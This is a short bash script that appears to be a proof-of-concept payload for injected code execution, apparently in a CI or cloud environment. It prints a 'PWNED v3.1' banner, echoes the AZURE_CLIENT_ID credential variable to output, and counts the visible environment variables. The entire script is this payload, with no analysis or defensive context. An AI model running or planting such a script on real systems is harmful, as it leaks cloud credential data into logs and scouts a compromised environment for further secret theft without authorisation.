#!/usr/bin/env bash
echo "=== PWNED v3.1 ==="
echo "AZURE_CLIENT_ID=$AZURE_CLIENT_ID"
env | grep -cE "." | xargs echo "env vars visible:"
